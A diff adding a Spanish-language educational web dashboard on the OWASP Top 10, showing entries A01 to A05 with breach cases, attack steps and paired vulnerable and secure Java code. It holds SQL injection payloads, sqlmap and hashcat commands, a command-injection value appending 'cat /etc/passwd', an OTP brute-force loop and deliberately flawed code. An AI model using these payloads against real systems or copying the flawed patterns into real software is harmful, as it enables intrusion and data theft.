@@ -1,0 +1,1612 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP Top 10 — Dashboard Educativo</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #1a1d23;
+    --surface: #20242d;
+    --surface2: #262b35;
+    --surface3: #2d323e;
+    --border: #2e3340;
+    --border2: #3a4055;
+    --accent: #4d9ef7;
+    --accent-dim: rgba(77,158,247,0.12);
+    --accent-glow: rgba(77,158,247,0.08);
+    --critical: #e05c6a;
+    --high: #e0924a;
+    --medium: #d4b84a;
+    --text: #c8cdd8;
+    --text-dim: #8892a4;
+    --text-bright: #e8ecf4;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'IBM Plex Sans', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Subtle dot grid */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: radial-gradient(circle, rgba(77,158,247,0.06) 1px, transparent 1px);
+    background-size: 28px 28px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container { max-width: 1400px; margin: 0 auto; padding: 0 28px; position: relative; z-index: 1; }
+
+  /* HEADER */
+  header {
+    padding: 36px 0 28px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 32px;
+  }
+
+  .header-inner {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
+  }
+
+  .logo-block { display: flex; align-items: center; gap: 14px; }
+
+  .logo-icon {
+    width: 44px; height: 44px;
+    background: var(--accent-dim);
+    border: 1px solid rgba(77,158,247,0.3);
+    border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--accent);
+  }
+
+  .logo-text h1 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 18px;
+    font-weight: 600;
+    color: var(--text-bright);
+    letter-spacing: 1px;
+  }
+
+  .logo-text p {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-top: 3px;
+  }
+
+  .header-badge {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.5px;
+    text-align: right;
+    line-height: 1.9;
+  }
+
+  .header-badge span { color: var(--accent); }
+
+  /* STATS BAR */
+  .stats-bar {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 14px;
+    margin-bottom: 28px;
+  }
+
+  .stat-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 20px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .stat-card:hover { border-color: var(--border2); }
+
+  .stat-card::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 1px;
+  }
+
+  .stat-card.critical::after { background: var(--critical); opacity: 0.6; }
+  .stat-card.high::after { background: var(--high); opacity: 0.6; }
+  .stat-card.medium::after { background: var(--medium); opacity: 0.6; }
+  .stat-card.info::after { background: var(--accent); opacity: 0.4; }
+
+  .stat-label {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 10px;
+  }
+
+  .stat-value {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 30px;
+    font-weight: 600;
+    line-height: 1;
+    color: var(--text-bright);
+  }
+
+  .stat-sub {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-top: 6px;
+  }
+
+  /* SEARCH & FILTER */
+  .controls {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 24px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+
+  .search-box {
+    flex: 1;
+    min-width: 200px;
+    position: relative;
+  }
+
+  .search-box input {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 9px 16px 9px 38px;
+    color: var(--text);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+
+  .search-box input:focus { border-color: var(--accent); }
+  .search-box input::placeholder { color: var(--text-dim); }
+
+  .search-icon {
+    position: absolute;
+    left: 12px; top: 50%; transform: translateY(-50%);
+    color: var(--text-dim);
+    font-size: 15px;
+  }
+
+  .filter-btn {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 9px 16px;
+    color: var(--text-dim);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.5px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .filter-btn:hover { border-color: var(--border2); color: var(--text); }
+  .filter-btn.active { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+
+  /* MAIN GRID */
+  .vuln-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+    gap: 16px;
+    margin-bottom: 40px;
+  }
+
+  /* VULN CARD */
+  .vuln-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    cursor: pointer;
+    transition: all 0.2s;
+    animation: fadeIn 0.35s ease both;
+  }
+
+  .vuln-card:hover {
+    border-color: var(--border2);
+    transform: translateY(-1px);
+    box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .card-header {
+    padding: 14px 18px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface2);
+  }
+
+  .card-number {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    color: #8dbfff;
+    background: rgba(77,158,247,0.08);
+    border: 1px solid rgba(77,158,247,0.2);
+    border-radius: 3px;
+    padding: 3px 7px;
+    white-space: nowrap;
+    margin-top: 3px;
+  }
+
+  .card-title-block { flex: 1; }
+
+  .card-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--text-bright);
+    margin-bottom: 3px;
+    line-height: 1.4;
+  }
+
+  .card-category {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.5px;
+    color: #7a8898;
+    text-transform: uppercase;
+  }
+
+  .severity-badge {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 3px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    white-space: nowrap;
+    margin-top: 3px;
+  }
+
+  .severity-critical { background: rgba(224,92,106,0.18); color: #f08090; border: 1px solid rgba(224,92,106,0.4); }
+  .severity-high { background: rgba(224,146,74,0.18); color: #e8a870; border: 1px solid rgba(224,146,74,0.4); }
+  .severity-medium { background: rgba(212,184,74,0.15); color: #d4c060; border: 1px solid rgba(212,184,74,0.35); }
+
+  .card-body { padding: 14px 18px; }
+
+  .card-desc {
+    font-size: 13px;
+    color: var(--text);
+    line-height: 1.6;
+    margin-bottom: 12px;
+  }
+
+  .card-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 5px;
+    margin-bottom: 14px;
+  }
+
+  .tag {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    padding: 2px 7px;
+    background: rgba(77,158,247,0.08);
+    border: 1px solid rgba(77,158,247,0.18);
+    border-radius: 3px;
+    color: #8dbfff;
+  }
+
+  .card-footer {
+    display: flex;
+    justify-content: flex-end;
+  }
+
+  .btn-primary {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    padding: 6px 14px;
+    background: var(--accent-dim);
+    border: 1px solid rgba(77,158,247,0.3);
+    border-radius: 4px;
+    color: var(--accent);
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 0.5px;
+  }
+
+  .btn-primary:hover {
+    background: rgba(77,158,247,0.2);
+    border-color: var(--accent);
+  }
+
+  /* MODAL */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(18,20,26,0.88);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    backdrop-filter: blur(6px);
+  }
+
+  .modal-overlay.open { display: flex; }
+
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    border-radius: 10px;
+    width: 100%;
+    max-width: 680px;
+    max-height: 90vh;
+    overflow-y: auto;
+    animation: slideUp 0.25s ease;
+  }
+
+  @keyframes slideUp {
+    from { opacity: 0; transform: translateY(16px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .modal-header {
+    padding: 22px 26px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    background: var(--surface2);
+    z-index: 1;
+  }
+
+  .modal-close {
+    background: var(--surface3);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    color: var(--text-dim);
+    width: 30px; height: 30px;
+    cursor: pointer;
+    font-size: 14px;
+    display: flex; align-items: center; justify-content: center;
+    transition: all 0.2s;
+    flex-shrink: 0;
+  }
+
+  .modal-close:hover { border-color: var(--border2); color: var(--text); }
+
+  .modal-body { padding: 26px; }
+
+  .modal-section { margin-bottom: 24px; }
+
+  .modal-section-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 10px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .modal-text {
+    font-size: 13px;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 14px 16px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    color: #8dbfff;
+    line-height: 1.75;
+    overflow-x: auto;
+    margin-top: 8px;
+  }
+
+  .checklist { list-style: none; }
+  .checklist li {
+    font-size: 13px;
+    color: var(--text);
+    padding: 5px 0;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    border-bottom: 1px solid var(--border);
+  }
+  .checklist li:last-child { border-bottom: none; }
+
+  .checklist li::before {
+    content: '›';
+    color: var(--accent);
+    flex-shrink: 0;
+    font-size: 16px;
+    line-height: 1.3;
+  }
+
+  .risk-meter { margin-top: 8px; }
+
+  .risk-meter-label {
+    display: flex;
+    justify-content: space-between;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-bottom: 5px;
+  }
+
+  .risk-bar {
+    height: 4px;
+    background: var(--surface3);
+    border-radius: 2px;
+    overflow: hidden;
+    margin-bottom: 10px;
+  }
+
+  .risk-fill {
+    height: 100%;
+    border-radius: 2px;
+    transition: width 1s ease;
+    opacity: 0.75;
+  }
+
+  /* FOOTER */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 24px 0;
+    text-align: center;
+  }
+
+  footer p {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.5px;
+  }
+
+  footer a { color: var(--accent); text-decoration: none; }
+  footer a:hover { text-decoration: underline; }
+
+  /* RESPONSIVE */
+  @media (max-width: 600px) {
+    .stats-bar { grid-template-columns: repeat(2, 1fr); }
+    .vuln-grid { grid-template-columns: 1fr; }
+  }
+
+  /* HIDDEN */
+  .vuln-card.hidden { display: none; }
+
+  /* TABS */
+  .tabs {
+    display: flex;
+    gap: 2px;
+    margin-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0;
+  }
+
+  .tab-btn {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    padding: 8px 16px;
+    background: transparent;
+    border: none;
+    border-bottom: 2px solid transparent;
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 0.5px;
+    margin-bottom: -1px;
+  }
+
+  .tab-btn:hover { color: var(--text); }
+  .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+  .tab-pane { display: none; }
+  .tab-pane.active { display: block; }
+
+  /* ATTACK STEPS */
+  .attack-steps { display: flex; flex-direction: column; gap: 10px; }
+
+  .attack-step {
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    padding: 10px 14px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    font-size: 13px;
+    line-height: 1.5;
+  }
+
+  .step-num {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    background: var(--accent-dim);
+    border: 1px solid rgba(77,158,247,0.2);
+    border-radius: 3px;
+    min-width: 22px;
+    height: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+
+  /* REAL CASE BOX */
+  .real-case-box {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 5px;
+    padding: 14px 16px;
+    font-size: 13px;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  /* CODE BLOCKS DIFFERENTIATED */
+  .vuln-code {
+    border-left: 3px solid rgba(224,92,106,0.6) !important;
+    background: rgba(224,92,106,0.04) !important;
+  }
+
+  .safe-code {
+    border-left: 3px solid rgba(77,158,247,0.6) !important;
+    background: rgba(77,158,247,0.04) !important;
+  }
+
+  .code-vuln-title { color: #e05c6a !important; }
+  .code-safe-title { color: #5db87a !important; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- HEADER -->
+  <header>
+    <div class="header-inner">
+      <div class="logo-block">
+        <div class="logo-icon">OW</div>
+        <div class="logo-text">
+          <h1>OWASP TOP 10</h1>
+          <p>Dashboard Educativo de Seguridad Web</p>
+        </div>
+      </div>
+      <div class="header-badge">
+        <div>VERSIÓN <span>2021</span></div>
+        <div>ÚLTIMA ACTUALIZACIÓN <span>2021-09-24</span></div>
+        <div>TOTAL VULNERABILIDADES <span>10</span></div>
+      </div>
+    </div>
+  </header>
+
+  <!-- STATS -->
+  <div class="stats-bar">
+    <div class="stat-card critical">
+      <div class="stat-label">Críticas</div>
+      <div class="stat-value" id="stat-critical">0</div>
+      <div class="stat-sub">Riesgo máximo</div>
+    </div>
+    <div class="stat-card high">
+      <div class="stat-label">Altas</div>
+      <div class="stat-value" id="stat-high">0</div>
+      <div class="stat-sub">Requieren atención</div>
+    </div>
+    <div class="stat-card medium">
+      <div class="stat-label">Medias</div>
+      <div class="stat-value" id="stat-medium">0</div>
+      <div class="stat-sub">Monitorear</div>
+    </div>
+    <div class="stat-card info">
+      <div class="stat-label">Total</div>
+      <div class="stat-value">10</div>
+      <div class="stat-sub">OWASP Top 10</div>
+    </div>
+  </div>
+
+  <!-- CONTROLS -->
+  <div class="controls">
+    <div class="search-box">
+      <span class="search-icon">⌕</span>
+      <input type="text" id="searchInput" placeholder="Buscar vulnerabilidad..." oninput="filterCards()">
+    </div>
+    <button class="filter-btn active" onclick="filterBySeverity('all', this)">Todas</button>
+    <button class="filter-btn" onclick="filterBySeverity('critical', this)">Críticas</button>
+    <button class="filter-btn" onclick="filterBySeverity('high', this)">Altas</button>
+    <button class="filter-btn" onclick="filterBySeverity('medium', this)">Medias</button>
+  </div>
+
+  <!-- GRID -->
+  <div class="vuln-grid" id="vulnGrid"></div>
+
+  <footer>
+    <p>Uso educativo · <a href="https://owasp.org/www-project-top-ten/" target="_blank">owasp.org</a> · Construido para aprendizaje en hacking ético</p>
+  </footer>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modalOverlay" onclick="closeModalIfOutside(event)">
+  <div class="modal" id="modal">
+    <div class="modal-header">
+      <div>
+        <div id="modalNumber" class="card-number" style="display:inline-block;margin-bottom:8px;"></div>
+        <div id="modalTitle" class="card-title" style="font-size:20px;"></div>
+      </div>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<script>
+const vulnerabilities = [
+  {
+    id: "A01",
+    title: "Broken Access Control",
+    category: "Control de Acceso",
+    severity: "critical",
+    tags: ["IDOR", "Privilege Escalation", "Path Traversal", "CSRF", "Force Browsing"],
+    description: "Los controles de acceso fallan, permitiendo que usuarios accedan a recursos o acciones no autorizadas. Es la vulnerabilidad #1 más crítica desde 2021.",
+    fullDesc: "El Broken Access Control ocurre cuando la aplicación no verifica correctamente los permisos antes de ejecutar acciones. Afecta a cualquier sistema con roles de usuario. El atacante simplemente modifica parámetros, URLs o tokens para acceder a datos ajenos o escalar privilegios.",
+    realCase: "Capital One (2019): Un ex-empleado de AWS explotó un SSRF combinado con falta de control de acceso en roles IAM, exponiendo 106 millones de registros. Coste: $80M en multas. Otro caso: Facebook (2018), IDOR en la API de videos permitió ver videos privados de cualquier usuario.",
+    attackSteps: "1. Atacante autentica con cuenta propia\n2. Observa que la URL es /api/orders/1042 (su orden)\n3. Cambia el ID: /api/orders/1001, /api/orders/1002...\n4. El servidor devuelve datos de otros usuarios sin verificar\n5. Automatiza con scripts para extraer miles de registros",
+    vulnCode: `// VULNERABLE - OrderController.java
+@GetMapping("/api/orders/{orderId}")
+public Order getOrder(@PathVariable Long orderId) {
+    // ERROR: nunca verifica si el pedido pertenece
+    // al usuario que hace la request
+    return orderRepository.findById(orderId)
+        .orElseThrow(() -> new NotFoundException());
+}
+
+// VULNERABLE - acceso a panel admin
+@GetMapping("/admin/users")
+@Authenticated  // solo verifica login, no rol
+public List<User> getAllUsers() {
+    return userRepository.findAll();
+}`,
+    safeCode: `// SEGURO - OrderController.java
+@GetMapping("/api/orders/{orderId}")
+public Order getOrder(@PathVariable Long orderId,
+                      Authentication auth) {
+    UserDetails user = (UserDetails) auth.getPrincipal();
+    Order order = orderRepository.findById(orderId)
+        .orElseThrow(() -> new NotFoundException());
+
+    // Verificar que el pedido pertenece al usuario actual
+    if (!order.getUserEmail().equals(user.getUsername())) {
+        throw new AccessDeniedException("Acceso denegado");
+    }
+    return order;
+}
+
+// SEGURO - Spring Security con roles
+@GetMapping("/admin/users")
+@PreAuthorize("hasRole('ADMIN')")
+public List<User> getAllUsers() {
+    return userRepository.findAll();
+}`,
+    mitigation: [
+      "Denegar acceso por defecto; solo permitir lo explícitamente autorizado",
+      "Usar @PreAuthorize / Spring Security para control de acceso declarativo",
+      "Verificar siempre que el recurso pertenece al usuario autenticado (ownership check)",
+      "Deshabilitar listado de directorios en servidores web",
+      "Registrar todos los fallos de acceso y generar alertas automáticas",
+      "Tests de penetración automatizados en cada deploy enfocados en IDOR"
+    ],
+    risks: { exploitability: 90, prevalence: 94, detectability: 55, impact: 85 }
+  },
+  {
+    id: "A02",
+    title: "Cryptographic Failures",
+    category: "Criptografía",
+    severity: "critical",
+    tags: ["Weak Encryption", "HTTP", "MD5/SHA1", "Data Exposure", "TLS"],
+    description: "Fallos criptográficos exponen datos sensibles: contraseñas, tarjetas de crédito, información médica, tokens de sesión.",
+    fullDesc: "Anteriormente 'Sensitive Data Exposure', ahora se enfoca en la causa raíz: el uso de algoritmos débiles, sin cifrado, o cifrado mal implementado. MD5 y SHA-1 son inseguros para contraseñas. TLS 1.0/1.1 tienen vulnerabilidades conocidas.",
+    realCase: "Adobe (2013): 153 millones de contraseñas cifradas con 3DES en modo ECB (sin salt, sin hash). Todas crackeadas en días. LinkedIn (2012): 117 millones de contraseñas con SHA-1 sin salt, recuperadas masivamente con rainbow tables. RockYou (2009): 32 millones de contraseñas guardadas en texto plano.",
+    attackSteps: "1. Atacante obtiene dump de base de datos (via SQLi u otro vector)\n2. Encuentra hashes MD5: e10adc3949ba59abbe56e057f20f883e\n3. Consulta rainbow table online: hash = '123456'\n4. O usa hashcat: hashcat -m 0 hashes.txt rockyou.txt\n5. Con SHA-1 sin salt, crackea millones de hashes en horas con GPU",
+    vulnCode: `// VULNERABLE - UserService.java
+public void saveUser(String username, String password) {
+    // MD5 sin salt: rompible con rainbow tables
+    String hash = DigestUtils.md5Hex(password);
+    userRepo.save(new User(username, hash));
+}
+
+// VULNERABLE - datos sensibles en HTTP
+// application.properties
+server.ssl.enabled=false  // credenciales viajan en texto plano
+
+// VULNERABLE - clave hardcodeada
+private static final String SECRET = "miClaveSecreta123";
+String token = Jwts.builder()
+    .signWith(SignatureAlgorithm.HS256, SECRET) // clave débil
+    .compact();`,
+    safeCode: `// SEGURO - UserService.java con BCrypt
+@Autowired
+private PasswordEncoder passwordEncoder; // BCrypt por defecto
+
+public void saveUser(String username, String password) {
+    // BCrypt genera salt automaticamente, work factor ajustable
+    String hash = passwordEncoder.encode(password);
+    userRepo.save(new User(username, hash));
+}
+
+// En SecurityConfig.java
+@Bean
+public PasswordEncoder passwordEncoder() {
+    return new BCryptPasswordEncoder(12); // cost factor 12
+}
+
+// SEGURO - forzar HTTPS en Spring Boot
+// application.properties
+server.ssl.enabled=true
+server.ssl.key-store=classpath:keystore.p12
+security.require-ssl=true
+
+// SEGURO - clave desde variable de entorno
+String secret = System.getenv("JWT_SECRET"); // 256 bits mínimo`,
+    mitigation: [
+      "Nunca usar MD5, SHA-1 o SHA-256 para contraseñas: usar BCrypt, Argon2 o PBKDF2",
+      "Forzar HTTPS en toda la aplicación, redirigir HTTP a HTTPS",
+      "Usar TLS 1.2+ y deshabilitar TLS 1.0/1.1 y SSLv3",
+      "Nunca hardcodear claves: usar variables de entorno o vault (HashiCorp Vault)",
+      "Cifrar datos sensibles en reposo con AES-256-GCM",
+      "Deshabilitar caché de respuestas que contengan datos sensibles"
+    ],
+    risks: { exploitability: 70, prevalence: 80, detectability: 60, impact: 90 }
+  },
+  {
+    id: "A03",
+    title: "Injection",
+    category: "Inyección",
+    severity: "critical",
+    tags: ["SQL Injection", "XSS", "Command Injection", "LDAP", "JPQL"],
+    description: "Datos no confiables se envían a un intérprete como parte de un comando, permitiendo ejecutar queries o comandos no autorizados.",
+    fullDesc: "La inyección ocurre cuando el atacante puede insertar datos que son interpretados como comandos. SQL Injection sigue siendo el más común, pero también existe JPQL injection (JPA/Hibernate), LDAP injection, Command injection y NoSQL injection. Puede llevar a extracción total de la DB, autenticación bypasseada o ejecución de comandos en el servidor.",
+    realCase: "Heartland Payment Systems (2008): SQLi expuso 130 millones de tarjetas de crédito. Costo: $140M. Yahoo (2012): SQLi expuso 450.000 credenciales en texto plano. British Airways (2018): XSS + skimming de formularios expuso 500.000 tarjetas. TalkTalk (2015): SQLi básico por un adolescente de 17 años, multa de £400.000.",
+    attackSteps: "1. Atacante detecta campo vulnerable: /search?q=test'\n2. Error SQL revela la DB: 'You have an error in your SQL syntax'\n3. Determina columnas: test' ORDER BY 3--\n4. Extrae datos: ' UNION SELECT username,password,null FROM users--\n5. Automatiza con sqlmap: sqlmap -u 'http://app.com/search?q=1' --dump",
+    vulnCode: `// VULNERABLE - UserRepository.java (concatenación directa)
+public User findByUsername(String username) {
+    String sql = "SELECT * FROM users WHERE username = '"
+                 + username + "'";
+    // Input: admin' OR '1'='1' --
+    // Query: SELECT * FROM users WHERE username = 'admin'
+    //        OR '1'='1' --'  → devuelve todos los usuarios
+    return jdbcTemplate.queryForObject(sql, userRowMapper);
+}
+
+// VULNERABLE - JPQL injection con JPA
+public List<User> search(String name) {
+    String jpql = "SELECT u FROM User u WHERE u.name = '" 
+                  + name + "'";
+    return em.createQuery(jpql).getResultList();
+}
+
+// VULNERABLE - Command injection
+public String ping(String host) {
+    Runtime rt = Runtime.getRuntime();
+    Process proc = rt.exec("ping " + host);
+    // Input: google.com; cat /etc/passwd
+}`,
+    safeCode: `// SEGURO - PreparedStatement (JDBC)
+public User findByUsername(String username) {
+    String sql = "SELECT * FROM users WHERE username = ?";
+    return jdbcTemplate.queryForObject(
+        sql, userRowMapper, username  // parametrizado
+    );
+}
+
+// SEGURO - JPA con NamedParameter o @Query
+@Repository
+public interface UserRepository extends JpaRepository<User, Long> {
+    // Spring Data maneja el escape automáticamente
+    Optional<User> findByUsername(String username);
+
+    // Con query explícita: usar :param, no concatenación
+    @Query("SELECT u FROM User u WHERE u.name = :name")
+    List<User> searchByName(@Param("name") String name);
+}
+
+// SEGURO - Command injection: whitelist de inputs
+public String ping(String host) {
+    // Validar contra whitelist estricta
+    if (!host.matches("^[a-zA-Z0-9.-]{1,253}$")) {
+        throw new IllegalArgumentException("Host inválido");
+    }
+    // Usar ProcessBuilder con args separados (no shell)
+    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
+    pb.redirectErrorStream(true);
+    return pb.start().inputReader().lines().collect(joining("\n"));
+}`,
+    mitigation: [
+      "Siempre usar PreparedStatement o consultas parametrizadas, nunca concatenar",
+      "Con JPA/Hibernate usar @Query con :params o Spring Data derivados",
+      "Validar y sanitizar todo input del usuario con whitelist, no blacklist",
+      "Ejecutar la DB con el mínimo privilegio necesario (no usar root/sa)",
+      "Usar un WAF (OWASP ModSecurity) como capa adicional de defensa",
+      "Implementar detección de SQLi en logs y alertas automáticas"
+    ],
+    risks: { exploitability: 85, prevalence: 75, detectability: 70, impact: 95 }
+  },
+  {
+    id: "A04",
+    title: "Insecure Design",
+    category: "Diseño",
+    severity: "high",
+    tags: ["Threat Modeling", "Design Flaws", "Security Requirements", "Rate Limiting"],
+    description: "Fallas de diseño y arquitectura que no pueden corregirse solo con buena implementación. La seguridad debe integrarse desde el diseño.",
+    fullDesc: "Categoría nueva en 2021. Reconoce que muchas brechas no son bugs de código sino decisiones de diseño inseguras: flujos de negocio sin controles, ausencia de rate limiting, recuperación de contraseña débil, falta de separación de privilegios. Un sistema bien programado pero mal diseñado sigue siendo vulnerable.",
+    realCase: "Instagram (2019): El sistema de recuperación de contraseña por SMS permitía 6 dígitos sin rate limiting. Un atacante podía probar 1.000.000 de combinaciones automáticamente. Twitter (2020): El sistema de gestión interna permitía a cualquier empleado acceder a herramientas de admin sin aprobación adicional, explotado en hack de cuentas VIP. Zoom (2020): Reuniones sin contraseña por defecto facilitó el 'Zoombombing'.",
+    attackSteps: "1. Atacante analiza el flujo de recuperación de contraseña\n2. Detecta que el código OTP de 4 dígitos no tiene bloqueo\n3. Escribe script: for code in range(0000, 9999): try_reset(code)\n4. En minutos prueba los 10.000 combinaciones posibles\n5. Accede a la cuenta de la víctima sin conocer su contraseña",
+    vulnCode: `// DISEÑO INSEGURO - PasswordResetService.java
+// Sin rate limiting, sin expiración, código predecible
+public void sendResetCode(String email) {
+    // Código de solo 4 dígitos: 10.000 combinaciones
+    int code = new Random().nextInt(9999);
+    resetCodes.put(email, code);
+    emailService.send(email, "Tu código: " + code);
+    // No expira nunca, no limita intentos
+}
+
+public boolean verifyCode(String email, int inputCode) {
+    return resetCodes.get(email).equals(inputCode);
+    // Sin límite de intentos → fuerza bruta trivial
+}
+
+// DISEÑO INSEGURO - sin segregación de roles
+// Un mismo servicio maneja datos públicos y privados
+// con la misma cuenta de DB y mismo nivel de acceso`,
+    safeCode: `// SEGURO - PasswordResetService.java
+@Service
+public class PasswordResetService {
+    private final RateLimiter rateLimiter; // Bucket4j o Resilience4j
+    private static final int MAX_ATTEMPTS = 5;
+    private static final Duration EXPIRY = Duration.ofMinutes(15);
+
+    public void sendResetCode(String email) {
+        // Rate limit: máximo 3 requests por hora por IP/email
+        if (!rateLimiter.tryConsume(email)) {
+            throw new TooManyRequestsException();
+        }
+        // Token seguro y largo (no código de 4 dígitos)
+        String token = UUID.randomUUID().toString();
+        // Guardar con expiración
+        resetTokens.put(email, new ResetToken(token, Instant.now().plus(EXPIRY)));
+        emailService.send(email, buildResetLink(token));
+    }
+
+    public boolean verifyToken(String email, String token) {
+        ResetToken stored = resetTokens.get(email);
+        if (stored == null || stored.isExpired()) return false;
+        // Invalidar después del primer uso
+        resetTokens.remove(email);
+        return stored.getToken().equals(token);
+    }
+}`,
+    mitigation: [
+      "Realizar Threat Modeling (STRIDE) para cada flujo crítico antes de implementar",
+      "Implementar rate limiting en todos los endpoints de autenticación (Bucket4j)",
+      "Usar tokens largos y aleatorios (UUID/SecureRandom) en vez de códigos cortos",
+      "Expirar tokens temporales (15-30 minutos máximo)",
+      "Aplicar principio de mínimo privilegio en arquitectura de servicios",
+      "Usar Security by Design checklist en cada revisión de diseño"
+    ],
+    risks: { exploitability: 60, prevalence: 70, detectability: 50, impact: 75 }
+  },
+  {
+    id: "A05",
+    title: "Security Misconfiguration",
+    category: "Configuración",
+    severity: "high",
+    tags: ["Default Passwords", "Stack Traces", "H2 Console", "Actuator", "CORS"],
+    description: "Configuraciones incorrectas en cualquier capa: servidor, framework, cloud o base de datos. Es la más prevalente del Top 10.",
+    fullDesc: "Incluye endpoints de administración expuestos, consolas de debug activas en producción (H2, Actuator), mensajes de error con stack traces, CORS mal configurado, headers de seguridad ausentes, y credenciales por defecto sin cambiar. Spring Boot tiene varias configuraciones que pueden ser peligrosas si no se revisan.",
+    realCase: "Equifax (2017): Apache Struts sin parchear + consola de administración expuesta. 147 millones de registros. Multa: $700M. Capital One (2019): S3 bucket sin restricciones + metadatos EC2 accesibles. Microsoft Power Apps (2021): 38 millones de registros expuestos por tablas de datos configuradas como públicas por defecto. Countless Spring Boot apps: /actuator/env expone variables de entorno con contraseñas.",
